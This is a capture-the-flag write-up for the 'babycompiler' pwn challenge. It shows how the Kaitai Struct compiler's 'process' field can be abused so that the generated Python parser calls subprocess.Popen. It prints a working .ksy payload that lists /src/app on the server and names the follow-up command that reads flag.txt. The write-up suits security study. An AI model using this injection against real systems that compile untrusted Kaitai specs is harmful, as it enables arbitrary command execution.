# babycompiler (pwn)

We are given the files `run.sh`, `run.py`, `requirements.txt`, `Dockerfile`, and the compiled `jar` files of a Java program called `kaitai-struct-compiler-0.10-SNAPSHOT` and its dependencies.

From searching online, we find that [Kaitai Struct](https://kaitai.io) is a language for describing binary data formats in YAML and has a compiler to generate parsers and APIs for these binary formats in many programming languages, kind of like Protobuf. The compiler is [open source](https://github.com/kaitai-io/kaitai_struct_compiler) and written in Scala, so we have no need to decompile the `jar` files for now if we assume that they were compiled unmodified from a recent commit on the `master` branch.

Now we can see how the challenge works. First a simple Linux environment is set up and then the `run.sh` script is run.
```dockerfile
FROM ubuntu:20.04

ARG DEBIAN_FRONTEND=noninteractive
RUN apt-get update
RUN apt-get install -fy wget python3 python3-pip openjdk-11-jdk-headless

WORKDIR /src/app

COPY ./src .

RUN pip3 install -r requirements.txt

RUN chmod +x ./run.sh

RUN useradd n00b
USER n00b

CMD ["./run.sh"]
```
Then `run.sh` takes a Kaitai Struct file that we supply, saves it in `sample.ksy`, and runs the Kaitai Struct compiler on it to generate a Python module named `sample.py`, which contains a parser for our data format.
```bash
#!/bin/bash

export PATH=$PWD/kaitai-struct-compiler-0.10-SNAPSHOT/bin:$PATH

TMPDIR=$(mktemp -d)

cp run.py "${TMPDIR}/"

pushd "${TMPDIR}"

echo "Give link to your YAML"

read -r url

wget "$url" -O ./sample.ksy

kaitai-struct-compiler --ksc-exceptions -t python ./sample.ksy

echo "Give link to your file for Kaitai to parse"

read -r f

wget "$f" -O ./f

python3 run.py f

popd

rm -rf "${TMPDIR}"
```
Then we supply a file containing the binary data we want to parse, and the server runs `run.py` on it, which is a simple wrapper that just passes it to the generated `Sample` parser to parse. It does not do anything else after parsing it.
```python
from sample import *
import sys

def main():
    a = Sample.from_file(sys.argv[1])

if __name__ == "__main__":
    if len(sys.argv) == 2:
        main()
```

Let's take a look at what the generated Python code is like. Given this `sample.ksy`:
```yaml
meta:
  id: test_record
  endian: be
seq:
- id: foo
  type: u4
- id: bar
  type: str
  size: 10
  encoding: UTF-8
```
We get this `sample.py`:
```python
# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild

from pkg_resources import parse_version
import kaitaistruct
import marshal
from kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO


if parse_version(kaitaistruct.__version__) < parse_version('0.9'):
    raise Exception("Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s" % (kaitaistruct.__version__))

class Sample(KaitaiStruct):
    def __init__(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self.foo = self._io.read_u4be()
        self.bar = (self._io.read_bytes(10)).decode(u"UTF-8")
```
Pretty straightforward.

Since this is a pwn challenge, our goal is to get some kind of arbitrary code execution. Parser generators often have some way of letting the user specify custom parsing code in the target language that will be inserted into the generated parser, for greater flexibility in parsing. Looking at the Kaitai Struct User Guide, we see two of these kinds of features under *Advanced Techniques*: [*Opaque types: plugging in external code*](https://doc.kaitai.io/user_guide.html#opaque-types) and [*Custom processing routines*](https://doc.kaitai.io/user_guide.html#custom-process).

When we add `ks-opaque-types: true` in the `meta` section and specify an unknown type for a value, the Kaitai Struct Python compiler will assume the existence of a module with the same name as the type, and generate code that imports the type's constructor from its module and calls it on the input stream. For instance,
```yaml
meta:
  id: test_record
  ks-opaque-types: true
seq:
- id: foo
  type: custom_object
```
generates
```python
import custom_object
class Sample(KaitaiStruct):
    def __init__(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self.foo = custom_object.CustomObject(self._io)
```
Since the name of the file containing the data to parse is hardcoded to be `f`, we have no way of supplying an attacker-controlled Python file and getting the generated parser to import it. Kaitai Struct doesn't seem to support specifying a different name for the Python type either. So our options are limited to finding modules in the Python standard library or in the only third party dependency, the [Kaitai Struct Python runtime library](https://github.com/kaitai-io/kaitai_struct_python_runtime), which contain a function with the same name as the module except in upper camel case, and when called gives us arbitrary code execution. Unfortunately I don't think any such module exists.

Taking a look at the [KSY syntax spec](https://doc.kaitai.io/ksy_diagram.html), we see that we can use some kind of namespacing in our custom type. Unfortunately, the custom type `bar::baz::custom_object` translates to
```python
import bar
bar.Bar.Baz.CustomObject(self._io)
```
which doesn't help either.

Moving on to custom processing routines, the generated code looks very similar. When a custom process type is specified, the compiler assumes the existence of a module with the same name as the custom processor, then imports it, creates an instance of the processor, and calls its `decode` method on the raw bytes. So
```yaml
meta:
  id: test_record
seq:
- id: foo
  size: 10
  process: custom_processor
```
translates to
```python
# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild

from pkg_resources import parse_version
import kaitaistruct
import marshal
from kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO
from custom_processor import CustomProcessor


if parse_version(kaitaistruct.__version__) < parse_version('0.9'):
    raise Exception("Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s" % (kaitaistruct.__version__))

class Sample(KaitaiStruct):
    def __init__(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self._raw_foo = self._io.read_bytes(10)
        _process = CustomProcessor()
        self.foo = _process.decode(self._raw_foo)
```
At first, this doesn't appear to be any more exploitable than the opaque types feature. But we can actually pass custom arguments to the custom processor as well. The intent is for these arguments to be previously parsed values from other parts of the file, but it seems like they can be any valid YAML constant, including numbers, booleans, strings, and lists, and they will get converted to the Python equivalent. So `process: custom_processor(1, false, ["foo", "bar"])` translates to `_process = CustomProcessor(1, False, [u"foo", u"bar"])`.

Finally, the custom processor field supports its own version of namespacing with the `.` separator. But this gets translated differently: `process: bar.baz.custom_processor` translates to
```python
import bar.baz
_process = bar.baz.CustomProcessor()
```
Crucially, the function name now no longer has to be the same as the module name. So the only restriction we have left is that the function name always gets turned into upper camel case, but we can import any upper camel case function from any module and call it with any constant arguments.

This rules out regular lowercase functions that can give us a shell like `os.system` or `code.interact`, but one uppercase function (constructor) that *does* let us do interesting things is `subprocess.Popen`. Given a list of strings as argument, it executes the first item as a program and passes the rest of the strings to it as arguments. Unfortunately we can't do `Popen(['/bin/sh'])` and directly get a shell that we can interact with, since just calling the `Popen` constructor doesn't wait for the process, you have to explicitly call the `wait` method for that. But we can execute any individual non-interactive command and see its output.

So now, with the following `sample.ksy`
```yaml
meta:
  id: test_record
seq:
- id: foo
  size: 1
  process: subprocess.popen(["ls", "/src/app"])
```
(note the lowercase `p` in `popen`!) we get the following `sample.py`:
```python
# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild

from pkg_resources import parse_version
import kaitaistruct
import marshal
from kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO
import subprocess


if parse_version(kaitaistruct.__version__) < parse_version('0.9'):
    raise Exception("Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s" % (kaitaistruct.__version__))

class Sample(KaitaiStruct):
    def __init__(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self._raw_foo = self._io.read_bytes(1)
        _process = subprocess.Popen([u"ls", u"/src/app"])
        self.foo = _process.decode(self._raw_foo)
```
Note that the code will actually crash on the line after the `Popen` call, with `AttributeError: 'Popen' object has no attribute 'decode'`. But by this time we will have already seen the output of the subprocess, which is all we need. Running it on the server, with any file as the data to parse, we get
```
/tmp/tmp.tDAAXnZfTK /src/app
Give link to your YAML
https://pastebin.com/raw/...
None
Give link to your file for Kaitai to parse
https://example.com
flag.txt
kaitai-struct-compiler-0.10-SNAPSHOT
requirements.txt
run.py
run.sh
ynetd
/src/app
```
Great, we have a `flag.txt` in `/src/app`. Now all we need to do is call `subprocess.Popen(['cat', '/src/app/flag.txt'])` to get the flag.
